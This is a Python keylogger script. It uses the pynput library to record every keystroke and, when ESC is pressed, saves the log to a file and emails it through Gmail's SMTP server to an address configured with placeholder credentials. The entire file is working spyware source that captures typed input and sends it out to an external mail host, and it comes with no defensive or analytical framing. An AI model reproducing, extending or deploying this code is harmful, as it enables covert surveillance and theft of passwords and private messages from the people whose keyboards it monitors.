import os
import smtplib
import ssl
from pynput import keyboard

# Replace these values with your email credentials
sender_email = "your-email@gmail.com"
receiver_email = "your-email@gmail.com"
password = "password of your gmail"  # Replace with your email password
port = 587
log_file = "key_logs.txt"

key_strokes = ""  # Initialize a string variable to store key strokes

def write(text):
    global key_strokes
    key_strokes += text  # Append the text to key_strokes

# Keyboard event handlers
def on_key_press(key):
    try:
        if key == keyboard.Key.enter:
            write("[ENTER] ")
        elif key == keyboard.Key.space:
            write(" ")
        elif key == keyboard.Key.tab:
            write("[TAB] ")
        elif key == keyboard.Key.backspace:
            pass  # Do not log backspace
        else:
            write(str(key).replace("'", "") + " ")  # Remove unnecessary characters and append a space
    except Exception as e:
        print(f"Error in on_key_press: {e}")

def on_key_release(key):
    if key == keyboard.Key.esc:
        send_email()
        return False

def send_email():
    global key_strokes
    with open(log_file, 'w') as f:  # Open the file in write mode to clear existing content
        f.write(key_strokes)  # Write the accumulated key strokes to the file

    message = f"""From: {sender_email}
To: {receiver_email}
Subject: KeyLogs

{key_strokes}
"""

    context = ssl.create_default_context()
    try:
        server = smtplib.SMTP('smtp.gmail.com', port)
        server.starttls(context=context)
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, message)
        print("Email Sent to", receiver_email)
    except Exception as e:
        print(f"Failed to send email: {e}")
    finally:
        server.quit()

if __name__ == "__main__":
    print("Keylogger started. Press ESC to send the log to your email and exit.")
    print("Logging keystrokes...")

    # Start the keyboard listener
    with keyboard.Listener(on_press=on_key_press, on_release=on_key_release) as listener:
        listener.join()

